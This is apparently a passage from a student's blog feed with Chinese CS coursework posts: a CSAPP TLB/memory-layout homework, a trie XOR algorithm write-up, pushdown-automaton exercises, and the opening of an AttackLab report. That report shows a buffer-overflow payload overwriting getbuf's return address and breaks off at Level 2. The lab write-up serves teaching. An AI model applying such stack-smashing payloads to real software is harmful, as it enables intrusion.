</li><li><code>TLB</code> 是 <code>4</code> 路组相联 (<code>4-way set associative</code>), 共有 <code>16</code> 个表项</li></ul><p>在下表中, 所有数字都是十六进制的. 前 <code>32</code> 页的 <code>TLB</code> 和页表内容如下：</p><p><img src="D:/Shortcut/Class/22%20%E7%A7%8B/CSAPP/Homework/Hw/pic/4.png"></p><ol><li>下面的框显示了虚拟地址的格式. 指出字段用于确定以下内容: VPO / VPN / TLBI / TLBT/</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">VPN: <span class="token number">15</span> - <span class="token number">10</span>VPO: <span class="token number">9</span> - <span class="token number">0</span>TLBI: <span class="token number">11</span> - <span class="token number">10</span>TLBT: <span class="token number">15</span> - <span class="token number">12</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>类似的标注出物理地址的格式: PPO / PPN </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PPN: <span class="token number">13</span> - <span class="token number">10</span>PPO: <span class="token number">9</span> - <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="2"><li>对于给定的两个虚拟地址 (<code>0x2F09</code>、<code>0x0C53</code>), 请分别表示出相应的 <code>TLB</code> 表项和物理地址, 并指出 <code>TLB</code> 是否命中、是否发生 <code>page fault</code>. 如 <code>page fault</code>, 请在 <code>PPN</code> 中输入 <code>-</code>, <code>C</code> 部分留白.</li></ol><p><strong>答:</strong></p><p><strong>0x2F09:</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">A:    Virtual Address:    0010 <span class="token number">1111</span> 0000 <span class="token number">1001</span>B:    VPN: 0x0B    TLB Index: 0x3    TLB Tag:0x2    TLB Hit: No <span class="token punctuation">(</span>注意这个 Hit<span class="token operator">!</span><span class="token punctuation">)</span>    Page Fault: Yes    PPN: -C:    Physical Address:    留白.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>0x0C53:</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">A:    Virtual Address:    0000 <span class="token number">1100</span> 0101 0011B:    VPN: 0x03    TLB Index: 0x3    TLB Tag:0x0    TLB Hit: Yes    Page Fault: No    PPN: 0xDC:    Physical Address:    <span class="token number">11</span> 0100 0101 0011<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>程序运行之前需要为程序分配对应的内存空间, 并为内存空间赋予一定的初始值和属性, 下表为 <code>x86</code> 架构下用户空间的内存映射关系. 请填写下表, 并说明可执行文件对应的段 (<code>.data</code>, <code>.bss</code>, <code>.init</code>, <code>.rodata</code>, <code>.text</code>) 段分别会被以什么属性映射到哪部分内存空间中.</p><table><thead><tr><th align="center">内存起始地址</th><th align="center">内存类型</th><th align="center">内存初始值</th><th align="center">内存属性</th></tr></thead><tbody><tr><td align="center">0xFFFFFFFF</td><td align="center">内核地址</td><td align="center">系统决定</td><td align="center">不可读不可写</td></tr><tr><td align="center">0xC0000000</td><td align="center">栈</td><td align="center"><strong>0(默认)</strong></td><td align="center"><strong>可读可写</strong></td></tr><tr><td align="center"><strong>由可执行文件决定</strong></td><td align="center"><strong>共享库内存映射区</strong></td><td align="center"><strong>共享库文件与可执行文件决定</strong></td><td align="center"><strong>只读</strong></td></tr><tr><td align="center">0x40000000</td><td align="center">运行时堆空间</td><td align="center"><strong>操作系统决定</strong></td><td align="center"><strong>可读可写</strong></td></tr><tr><td align="center">由可执行文件决定</td><td align="center"><strong>可读写数据段</strong></td><td align="center">.<strong>data由可执行文件决定, <br>.bss为 0</strong></td><td align="center">可读可写</td></tr><tr><td align="center"><strong>由可执行文件决定</strong></td><td align="center"><strong>只读数据</strong></td><td align="center"><strong>可执行文件决定</strong></td><td align="center"><strong>只读</strong></td></tr><tr><td align="center">0x08048000</td><td align="center">保留内存地址</td><td align="center"></td><td align="center"></td></tr></tbody></table><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">.data:  可读可写  映射到可读写数据段..bss:  可读可写  映射到可读写数据段..text:  只读  映射到只读数据.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Circuit</title>
      <link href="/35/"/>
      <url>/35/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-PA4"><a href="#CST-PA4" class="headerlink" title="CST PA4"></a>CST PA4</h1><h2 id="4-1-Circuit"><a href="#4-1-Circuit" class="headerlink" title="4-1 Circuit"></a>4-1 Circuit</h2><h3 id="算法构思"><a href="#算法构思" class="headerlink" title="算法构思"></a>算法构思</h3><h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><p>本题需使用 <code>Trie Tree</code> 数据结构, 关于 <code>Trie Tree</code> 的介绍可参考<a href="https://zh.wikipedia.org/zh-hans/Trie">此篇文章</a>. 因为涉及的字符仅为 <code>0</code>, <code>1</code>, 因此实质上相当于一棵 <code>Binary Tree</code>.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Line 7</span>ull str<span class="token punctuation">[</span><span class="token number">500500</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> ans<span class="token punctuation">[</span><span class="token number">500500</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用 <code>unsigned long long str[]</code> 数组储存 <code>01</code> 串, 不断更改当前的查询串编号, 将超出区间的串从 <code>Trie Tree</code> 中删去, 进入区间的串添加到 <code>Trie Tree</code> 中, 得到的结果存储在 <code>int ans[]</code> 中.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Line 14</span>class node <span class="token punctuation">{</span>public<span class="token operator">:</span>    <span class="token keyword">int</span> son<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span> trie<span class="token punctuation">[</span><span class="token number">32001000</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因此 <code>Trie Tree</code> 中的串至多为 <code>500000</code> 个, <code>Trie Tree</code> 中的节点至多为 <code>500000 * 64 = 32000000</code> 个. 在节点内部维护其左右子节点 <code>son[0]</code>, <code>son[1]</code>, 并记录经过该节点的 <code>01</code> 串数 <code>cnt</code>.</p><h4 id="void-ReadAll"><a href="#void-ReadAll" class="headerlink" title="void ReadAll()"></a>void ReadAll()</h4><p>使用 <code>getchar()</code> 逐字符读入所给串, 计算其二进制值并存储为 <code>unsigned long long</code>.</p><h4 id="void-Insert"><a href="#void-Insert" class="headerlink" title="void Insert()"></a>void Insert()</h4><p>定义全局变量 <code>pointer</code> 记录下一个将被利用的节点编号.</p><p>对于一个 <code>unsigned long long</code> 存储的 <code>01</code> 串, 从根节点 <code>trie[0]</code> 开始从高到低逐位读取其各位数值, 为 <code>0</code> 则转向当前节点左孩子, 为 <code>1</code> 则转向当前节点右孩子. 若子节点存在, 则相应 <code>cnt++</code>; 若子节点为空, 则用 <code>trie[pointer]</code> 对其初始化, 并 <code>cnt++</code>.</p><p>当读入 <code>01</code> 串最后一位, 到达叶节点时, 直接将对应 <code>01</code> 串的编号存储在叶节点的 <code>cnt</code> 中.</p><h4 id="void-Remove"><a href="#void-Remove" class="headerlink" title="void Remove()"></a>void Remove()</h4><p>对于一个 <code>unsigned long long</code> 存储的 <code>01</code> 串, 按照同样过程在 <code>Trie Tree</code> 中访问其各个节点, 对应 <code>cnt--</code>. 若 <code>cnt</code> 减少到 <code>0</code>, 直接将其父节点的子节点标记置为 <code>0</code>, 以该节点为根的子树在之后都不会被访问.</p><h4 id="int-Query"><a href="#int-Query" class="headerlink" title="int Query()"></a>int Query()</h4><p>为了获得最大异或和, 在树上的每一步向下移动都尝试向着与所给串相反的方向进行即可.</p><h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><ul><li>按照编号从下往上扫描序列, 向 <code>Trie Tree</code> 中插入字符串, 靠前字符串编号会覆盖靠后字符串编号, 查询时即可输出最靠前序列编号.</li><li>特别地, 若所有 <code>01</code> 串均相同, 那么 <code>Trie Tree</code> 退化为一条单链. 此时唯一叶节点会在最后被串 <code>0</code> 标记覆盖, <code>Query(0)</code> 返回 <code>0</code>, 只需将其单独改为 <code>1</code> 即可.</li></ul><h3 id="复杂度估计"><a href="#复杂度估计" class="headerlink" title="复杂度估计"></a>复杂度估计</h3><h4 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><p>对每个 <code>01</code> 串进行 <code>Insert</code>, <code>Remove</code>, <code>Query</code> 的时间复杂度均为 $O(1)$, 而每个串至多进行 <code>Insert</code>, <code>Remove</code>, <code>Query</code> 各一次.</p><p>综上, 算法总体时间复杂度为 $O(64n)$.</p><h4 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h4><p>插入的串至多产生64n个节点，而每个节点只维护了左节点、右节点、经过次数（叶节点单位值）这三个信息，因此空间复杂度为O(64n)，常数上限为3倍。</p><p>其他数组均为500050大小，相对花销较小。</p><p>本体空间复杂度取决于 <code>01</code>串数 <code>n</code>, 最多在 <code>Trie Tree</code> 中产生 $64n$ 个节点. 题解中使用 <code>trie[]</code>, <code>str[]</code> 与 <code>ans[]</code> 数组模拟了一棵 <code>Trie Tree</code>, 最坏情况下整体需要的空间为 $O(64n)$.</p><p>本题中直接开辟了相关大小的数组存储信息,</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 7</span>ull str<span class="token punctuation">[</span><span class="token number">500500</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> ans<span class="token punctuation">[</span><span class="token number">500500</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 14</span>class node <span class="token punctuation">{</span>public<span class="token operator">:</span>    <span class="token keyword">int</span> son<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span> trie<span class="token punctuation">[</span><span class="token number">32001000</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>空间消耗最坏情况约为: $5\times 10^5 \times 8B + 5\times 10^5 \times 4B + 3.2\times 10^7 \times 12B = 372MB &lt; 512MB$, 符合题目要求范围.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>形式语言与自动机 作业8</title>
      <link href="/34/"/>
      <url>/34/</url>
      
        <content type="html"><![CDATA[<h2 id="必做题"><a href="#必做题" class="headerlink" title="必做题"></a>必做题</h2><h3 id="Ex-6-4-2-c"><a href="#Ex-6-4-2-c" class="headerlink" title="Ex 6.4.2 (c)"></a>Ex 6.4.2 (c)</h3><p>​    构造以终态方式接受的 $DPDA$ </p><p><img src="/pic/43.png"></p><h3 id="Ex-6-4-3-a"><a href="#Ex-6-4-3-a" class="headerlink" title="Ex 6.4.3 (a)"></a>Ex 6.4.3 (a)</h3><p>​    假设以空栈方式接受的 $DPDA$ $P$ 接受串 $w\in L$, 考虑 $x\ne\varepsilon$.</p><p>​    那么我们存在状态 $q$,<br>​    $$(q_0, wx, Z_0)\vdash^{*}(q, x, \varepsilon).$$<br>​    此时栈已空, 即 $DPDA$ 不能继续转移, 从而 $P$ 不能接受 $wx$.</p><p>​    即 $DPDA$ $P$ 接受的语言 $L$ 具有前缀性质.</p><h3 id="Ex-6-4-3-b"><a href="#Ex-6-4-3-b" class="headerlink" title="Ex 6.4.3 (b)"></a>Ex 6.4.3 (b)</h3><p>​    从 $P$ 构造以终态方式接受的 $DPDA$ $P’$:</p><p>​    (1) 增加初始状态 $q_0’$ 和初始栈符 $Z_0’$, 增加转移<br>​    $$\delta(q_0’, \varepsilon, Z_0’) = {(q_0, Z_0Z_0’)}.$$<br>​    其中 $q_0$, $Z_0$ 为 $P$ 的初始状态和初始栈符.</p><p>​    (2) 增加终止状态 $q_f’$, 对 $P$ 中每一状态 $q$ 增加转移<br>​    $$\delta(q, \varepsilon, Z_0’) = {(q_f’, Z_0’)}.$$<br>​    由于 $P’$ 经过一步推导进入 $P$, $P$ 是确定的, </p><p>​    并且 $P’$ 进行推导的第一步和最后一步是确定的,</p><p>​    从而 $P’$ 是一个以终态方式接受的 $DPDA$.</p><h3 id="Ex-6-4-3-c"><a href="#Ex-6-4-3-c" class="headerlink" title="Ex 6.4.3 (c)"></a>Ex 6.4.3 (c)</h3><p>​    从 $P’$ 构造以空栈方式接受的 $DPDA$ $P$:</p><p>​    (1) 增加初始状态 $q_0$ 和初始栈符 $Z_0$, 增加转移<br>​    $$\delta(q_0, \varepsilon, Z_0) = {(q_0’, Z_0’Z_0)}.$$<br>​    其中 $q_0’$, $Z_0’$ 为 $P’$ 的初始状态和初始栈符.</p><p>​    (2) 增加状态 $q$, 对 $P’$ 中所有接受状态 $q’$ 和栈符号 $Z’$, 增加转移<br>$$<br>\begin{aligned}<br>\delta(q’, \varepsilon, Z’) &amp;= {(q, \varepsilon)}, \<br>\delta(q, \varepsilon, Z’) &amp;= {(q, \varepsilon)}.<br>\end{aligned}<br>$$<br>​    从而 $P$ 是一个以空栈方式接受的 $PDA$, $L(P) = L$.</p><p>​    由于 $L$ 具有前缀性质, 因此 $P$ 具有确定性.</p><p>​    从而 $P$ 是一个以空栈方式接受的 $DPDA$.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> FL&amp;A </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FL&amp;A </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>形式语言与自动机 作业7</title>
      <link href="/33/"/>
      <url>/33/</url>
      
        <content type="html"><![CDATA[<h2 id="必做题"><a href="#必做题" class="headerlink" title="必做题"></a>必做题</h2><h3 id="Ex-6-3-2"><a href="#Ex-6-3-2" class="headerlink" title="Ex 6.3.2"></a>Ex 6.3.2</h3><p>​    构造以空栈方式接受的 $PDA$<br>​    $$P = (\left{q\right}, \left{a, b\right}, \left{S, A, a, b\right}, \delta, q, S),$$<br>​    其中<br>$$<br>\begin{aligned}<br>\delta(q, \varepsilon, S) &amp;= \left{(q, aAA)\right}, \<br>\delta(q, \varepsilon, A) &amp;= \left{(q, aS), (q, bS), (q, a)\right}, \<br>\delta(q, a, a) &amp;= \left{(q, \varepsilon)\right}, \<br>\delta(q, b, b) &amp;= \left{(q, \varepsilon)\right}.<br>\end{aligned}<br>$$</p><h3 id="Ex-6-3-4"><a href="#Ex-6-3-4" class="headerlink" title="Ex 6.3.4"></a>Ex 6.3.4</h3><p>​    构造上下文无关文法<br>​    $$G = (V, \left{0, 1\right}, P, S),$$<br>​    其中<br>​    $$V = {S, [pZ_0p], [pZ_0q], [qZ_0p], [qZ_0q], [pXp], [pXq], [qXp], [qXq]}.$$<br>​    $P$ 中包含以下产生式:</p><p>​    由 $(1)$ 得到的产生式:<br>$$<br>\begin{aligned}<br>{}[qZ_0p] &amp;\rightarrow 0[qXq][qZ_0p] \<br>[qZ_0p] &amp;\rightarrow 0[qXp][pZ_0p] \<br>[qZ_0q] &amp;\rightarrow 0[qXq][qZ_0q] \<br>[qZ_0q] &amp;\rightarrow 0[qXp][pZ_0q]<br>\end{aligned}<br>$$<br>​    由 $(2)$ 得到的产生式:<br>$$<br>\begin{aligned}<br>{}[qXp] &amp;\rightarrow 0[qXq][qXp] \<br>[qXp] &amp;\rightarrow 0[qXp][pXp] \<br>[qXq] &amp;\rightarrow 0[qXq][qXq] \<br>[qXq] &amp;\rightarrow 0[qXp][pXq]<br>\end{aligned}<br>$$<br>​    由 $(3)$ 得到的产生式:<br>$$<br>\begin{aligned}<br>{}[qXq] &amp;\rightarrow 1[qXq] \<br>[qXp] &amp;\rightarrow 1[qXp]<br>\end{aligned}<br>$$<br>​    由 $(4)$ 得到的产生式:<br>​    $$[qXp] \rightarrow \varepsilon$$<br>​    由 $(5)$ 得到的产生式:<br>​    $$[pXp] \rightarrow \varepsilon$$<br>​    由 $(6)$ 得到的产生式:<br>$$<br>\begin{aligned}<br>{}[pXp] &amp;\rightarrow 1[pXq][qXp] \<br>[pXp] &amp;\rightarrow 1[pXp][pXp] \<br>[pXq] &amp;\rightarrow 1[pXq][qXq] \<br>[pXq] &amp;\rightarrow 1[pXp][pXq]<br>\end{aligned}<br>$$<br>​     由 $(7)$ 得到的产生式:<br>​    $$[pZ_0p] \rightarrow 1$$<br>​    由 $(8)$ 得到的产生式:<br>$$<br>\begin{aligned}<br>S &amp;\rightarrow [qZ_0q] \<br>S &amp;\rightarrow [qZ_0p]<br>\end{aligned}<br>$$</p><h3 id="Ex-6-3-5-c"><a href="#Ex-6-3-5-c" class="headerlink" title="Ex 6.3.5 (c)"></a>Ex 6.3.5 (c)</h3><p>​    该语言的一个上下文无关文法为:<br>​    $$S\rightarrow 0S1\mid 0S11\mid\varepsilon.$$<br>​    转换为以空栈方式接受的 $PDA$<br>​    $$P = (\left{q\right}, \left{0, 1\right}, \left{S, 0, 1\right}, \delta, q, S),$$</p><p>​    其中<br>$$<br>\begin{aligned}<br>\delta(q, \varepsilon, S) &amp;= \left{(q, \varepsilon), (q, 0S1), (q, 0S11)\right}, \<br>\delta(q, 0, 0) &amp;= \left{(q, \varepsilon)\right}, \<br>\delta(q, 1, 1) &amp;= \left{(q, \varepsilon)\right}.<br>\end{aligned}<br>$$</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> FL&amp;A </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FL&amp;A </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>形式语言与自动机 作业6</title>
      <link href="/32/"/>
      <url>/32/</url>
      
        <content type="html"><![CDATA[<h2 id="必做题"><a href="#必做题" class="headerlink" title="必做题"></a>必做题</h2><h3 id="Ex-6-2-1-b"><a href="#Ex-6-2-1-b" class="headerlink" title="Ex 6.2.1 (b)"></a>Ex 6.2.1 (b)</h3><p>​    构造以终态方式接受的 $PDA$<br>​    $$P = (\left{q_0\right}, \left{0, 1\right}, \left{Z_0, X\right}, \delta, q_0, Z_0, \left{q_0\right}),$$<br>​    其中<br>$$<br>\begin{aligned}<br>\delta(q_0, 0, Z_0) &amp;= \left{(q_0, XZ_0)\right}, \<br>\delta(q_0, 0, X) &amp;= \left{(q_0, XX)\right}, \<br>\delta(q_0, 1, X) &amp;= \left{(q_0, \varepsilon)\right}.<br>\end{aligned}<br>$$<br>​    <img src="/pic/41.png"></p><h3 id="Ex-6-2-1-c"><a href="#Ex-6-2-1-c" class="headerlink" title="Ex 6.2.1 (c)"></a>Ex 6.2.1 (c)</h3><p>​    构造以空栈方式接受的 $PDA$<br>​    $$P = (\left{q_0, q_1\right}, \left{0, 1\right}, \left{Z_0, X\right}, \delta, q_0, Z_0),$$<br>​    其中<br>$$<br>\begin{aligned}<br>\delta(q_0, 0, Z_0) &amp;= \left{(q_0, XZ_0)\right}, \<br>\delta(q_0, 1, Z_0) &amp;= \left{(q_1, XZ_0)\right}, \<br>\delta(q_1, 0, Z_0) &amp;= \left{(q_0, XZ_0)\right}, \<br>\delta(q_1, 1, Z_0) &amp;= \left{(q_1, XZ_0)\right}, \<br>\delta(q_0, 0, X) &amp;= \left{(q_0, XX)\right}, \<br>\delta(q_0, 1, X) &amp;= \left{(q_0, \varepsilon)\right}, \<br>\delta(q_1, 0, X) &amp;= \left{(q_1, \varepsilon)\right}, \<br>\delta(q_1, 1, X) &amp;= \left{(q_1, XX)\right}, \<br>\delta(q_0, \varepsilon, Z_0) &amp;= \left{(q_0, \varepsilon)\right}, \<br>\delta(q_1, \varepsilon, Z_0) &amp;= \left{(q_1, \varepsilon)\right}.<br>\end{aligned}<br>$$<br>​    <img src="/pic/42.png"></p><h3 id="Ex-6-2-6-a"><a href="#Ex-6-2-6-a" class="headerlink" title="Ex 6.2.6 (a)"></a>Ex 6.2.6 (a)</h3><p>​    转换为以空栈方式接受的 $PDA$<br>​    $$P_1 = (\left{q, p\right}, \left{0, 1\right}, \left{Z_0, X\right}, \delta, q, Z_0),$$<br>​    其中<br>$$<br>\begin{aligned}<br>\delta(q, 0, Z_0) &amp;= \left{(q, XZ_0)\right}, \<br>\delta(q, 0, X) &amp;= \left{(q, XX)\right}, \<br>\delta(q, 1, X) &amp;= \left{(q, X)\right}, \<br>\delta(q, \varepsilon, X) &amp;= \left{(p, \varepsilon)\right}, \<br>\delta(p, 1, X) &amp;= \left{(p, XX)\right}, \<br>\delta(p, 1, Z_0) &amp;= \left{(p, \varepsilon)\right}, \<br>\delta(p, \varepsilon, Z_0) &amp;= \left{(p, \varepsilon)\right}, \<br>\delta(p, \varepsilon, X) &amp;= \left{(p, \varepsilon)\right}.<br>\end{aligned}<br>$$</p><h3 id="Ex-6-2-6-b"><a href="#Ex-6-2-6-b" class="headerlink" title="Ex 6.2.6 (b)"></a>Ex 6.2.6 (b)</h3><p>​    转换为以终态方式接受的 $PDA$<br>​    $$P_2 = (\left{p_0, p_f, q, p\right}, \left{0, 1\right}, \left{Z_0, X, X_0\right}, \delta, q, Z_0, \left{p_f\right}),$$<br>​    其中<br>$$<br>\begin{aligned}<br>\delta(p_0, \varepsilon, X_0) &amp;= \left{(q, Z_0X_0)\right}, \<br>\delta(q, 0, Z_0) &amp;= \left{(q, XZ_0)\right}, \<br>\delta(q, 0, X) &amp;= \left{(q, XX)\right}, \<br>\delta(q, 1, X) &amp;= \left{(q, X)\right}, \<br>\delta(q, \varepsilon, X) &amp;= \left{(p, \varepsilon)\right}, \<br>\delta(q, \varepsilon, X_0) &amp;= \left{(p_f, \varepsilon)\right}, \<br>\delta(p, 1, X) &amp;= \left{(p, XX)\right}, \<br>\delta(p, 1, Z_0) &amp;= \left{(p, \varepsilon)\right}, \<br>\delta(p, \varepsilon, X) &amp;= \left{(p, \varepsilon)\right}, \<br>\delta(p, \varepsilon, X_0) &amp;= \left{(p_f, \varepsilon)\right}.<br>\end{aligned}<br>$$</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> FL&amp;A </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FL&amp;A </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机系统概论 Lab 2</title>
      <link href="/31/"/>
      <url>/31/</url>
      
        <content type="html"><![CDATA[<h1 id="Lab-2-AttackLab-实验报告"><a href="#Lab-2-AttackLab-实验报告" class="headerlink" title="Lab 2 AttackLab 实验报告"></a>Lab 2 AttackLab 实验报告</h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><ul><li>学习 <code>GDB</code>与 <code>OBJDUMP</code> 的用法;</li><li>了解如何对没有保证缓冲区溢出安全的程序进行攻击;</li><li>熟悉 <code>x86-64</code> 构架下程序栈和参数传递的运行过程.</li></ul><h2 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h2><p>导致程序漏洞的关键为 <code>getbuf</code> 函数:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token function">getbuf</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span>BUFFER_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">Gets</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>getbuf</code> 函数在栈中申请了一块 <code>BUFFER_SIZE</code> 大小的空间, 并利用这块空间首地址作为 <code>Gets</code> 函数的参数从标准输入中读取字符. 我们可以通过提供一个超过 <code>BUFFER_SIZE</code> 的字符串来向 <code>getbuf</code> 的栈帧之外写入数据.</p><h2 id="Code-Injection-Attacks"><a href="#Code-Injection-Attacks" class="headerlink" title="Code Injection Attacks"></a>Code Injection Attacks</h2><h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p>需要重写函数的正常返回地址, 将函数重定向到 <code>touch1</code> 函数.</p><p>首先查看 <code>ctarget</code> 的反汇编代码.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">linux<span class="token operator">&gt;</span> objdump <span class="token parameter variable">-d</span> ctarget<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 <code>getbuf</code> 中, <code>%rsp</code> 被减了 <code>0x38</code>, <code>BUFFER_SIZE</code> 大小是 <code>56</code>.</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0000000000401cdb &lt;getbuf&gt;:  401cdb:f3 0f 1e fa          endbr64   401cdf:48 83 ec 38          sub    $0x38,%rsp  401ce3:48 89 e7             mov    %rsp,%rdi  401ce6:e8 b5 02 00 00       callq  401fa0 &lt;Gets&gt;  401ceb:b8 01 00 00 00       mov    $0x1,%eax  401cf0:48 83 c4 38          add    $0x38,%rsp  401cf4:c3                   retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>touch1</code> 函数地址是 <code>0x401cf5</code>.</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0000000000401cf5 &lt;touch1&gt;:  401cf5:f3 0f 1e fa          endbr64   401cf9:50                   push   %rax  401cfa:58                   pop    %rax  401cfb:48 83 ec 08          sub    $0x8,%rsp  401cff:c7 05 f3 57 00 00 01 movl   $0x1,0x57f3(%rip)        # 4074fc &lt;vlevel&gt;  401d06:00 00 00   401d09:48 8d 3d f1 25 00 00 lea    0x25f1(%rip),%rdi        # 404301 &lt;_IO_stdin_used+0x301&gt;  401d10:e8 6b f3 ff ff       callq  401080 &lt;puts@plt&gt;  401d15:bf 01 00 00 00       mov    $0x1,%edi  401d1a:e8 f4 04 00 00       callq  402213 &lt;validate&gt;  401d1f:bf 00 00 00 00       mov    $0x0,%edi  401d24:e8 b7 f4 ff ff       callq  4011e0 &lt;exit@plt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解题思路:</p><ul><li>将 <code>getbuf</code> 函数栈上分配的空间填满, 并且在下 <code>8</code> 个字节, 即正常返回地址上填充 <code>touch1</code> 的地址.</li><li><code>getbuf</code> 函数执行 <code>ret</code> 指令后, 会从 <code>%rsp+56</code> 处获取返回地址, 而这块地址被改为 <code>touch1</code> 的地址, 程序返回 <code>touch1</code> 而非 <code>test</code>.</li></ul><p><img src="/pic/36.png" alt="栈帧结构"></p><p>现在构建输入字符串: 首先使用 <code>0x00</code> 填充栈上 <code>56</code> 个字节, 然后填充<code>touch1</code>地址, 注意字节序为小端序存储.</p><pre class="line-numbers language-none"><code class="language-none"># 1.txt00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00f5 1c 40 00 00 00 00 00  &lt;----- touch1 的起始地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><p>需要在输入字符串中注入一段代码, 将 <code>cookie</code> 传递进 <code>%rdi</code> 作为参数, 然后程序流跳转到 <code>touch2</code> 函数.</p><p>我的 <code>cookie</code> 值为 <code>0x36bf93ac</code>, <code>touch2</code> 函数会验证传入的参数 <code>val</code> 是否和 <code>cookie</code> 相等.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">touch2</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> val<span class="token punctuation">)</span><span class="token punctuation">{</span>    vlevel <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> cookie<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Touch2!: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token 